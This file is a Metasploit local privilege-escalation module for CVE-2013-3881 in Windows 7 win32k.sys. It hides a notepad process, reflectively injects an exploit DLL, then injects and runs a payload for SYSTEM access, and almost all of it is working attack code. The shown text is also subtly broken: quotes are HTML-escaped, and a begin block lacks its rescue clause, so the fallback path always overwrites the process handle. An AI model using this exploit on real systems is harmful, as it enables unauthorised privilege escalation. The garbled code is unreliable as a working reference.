# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;msf/core/post/windows/reflective_dll_injection&#039;
require &#039;rex&#039;
 
class Metasploit3 < Msf::Exploit::Local
  Rank = AverageRanking
 
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection
 
  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;           => &#039;Windows TrackPopupMenuEx Win32k NULL Page&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in win32k.sys where under
        specific conditions TrackPopupMenuEx will pass a NULL pointer to
        the MNEndMenuState procedure. This module has been tested
        successfully on Windows 7 SP0 and Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Seth Gibson&#039;, # vulnerability discovery
          &#039;Dan Zentner&#039;, # vulnerability discovery
          &#039;Matias Soler&#039;, # vulnerability analysis
          &#039;Spencer McIntyre&#039;
        ],
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows 7 SP0/SP1&#039;, { } ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 4096,
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-3881&#039; ],
          [ &#039;OSVDB&#039;, &#039;98212&#039; ],
          [ &#039;BID&#039;, &#039;62830&#039;],
          [ &#039;MSB&#039;, &#039;MS13-081&#039; ],
          [ &#039;URL&#039;, &#039;http://endgame.com/news/microsoft-win32k-null-page-vulnerability-technical-analysis.html&#039; ],
          [ &#039;URL&#039;, &#039;http://immunityproducts.blogspot.com/2013/11/exploiting-cve-2013-3881-win32k-null.html&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 08 2013&#039;,
      &#039;DefaultTarget&#039;  => 0
    }))
  end
 
  def check
    os = sysinfo["OS"]
    if (os =~ /windows/i) == nil
      return Exploit::CheckCode::Unknown
    end
 
    file_path = expand_path("%windir%") << "\\system32\\win32k.sys"
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")
 
    case build
    when 7600
      return Exploit::CheckCode::Vulnerable
    when 7601
      return Exploit::CheckCode::Vulnerable if revision <= 18126
    when 9200
      return Exploit::CheckCode::Safe
    end
    return Exploit::CheckCode::Unknown
  end
 
  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, &#039;Session is already elevated&#039;)
    end
 
    if check != Exploit::CheckCode::Vulnerable
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system.")
    end
 
    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, "Running against WOW64 is not supported")
    elsif sysinfo["Architecture"] =~ /x64/
      fail_with(Failure::NoTarget, "Running against 64-bit systems is not supported")
    end
 
    print_status("Launching notepad to host the exploit...")
    notepad_process = client.sys.process.execute("notepad.exe", nil, {&#039;Hidden&#039; => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      # Reader Sandbox won&#039;t allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status("Operation failed. Trying to elevate the current process...")
      process = client.sys.process.open
    end
 
    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, "exploits",
                               "cve-2013-3881", "cve-2013-3881.x86.dll")
    library_path = ::File.expand_path(library_path)
 
    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)
 
    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)
 
    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status("Payload injected. Executing exploit...")
    process.thread.create(exploit_mem + offset, payload_mem)
 
    print_good("Exploit finished, wait for (hopefully privileged) payload execution to complete.")
  end
 
end

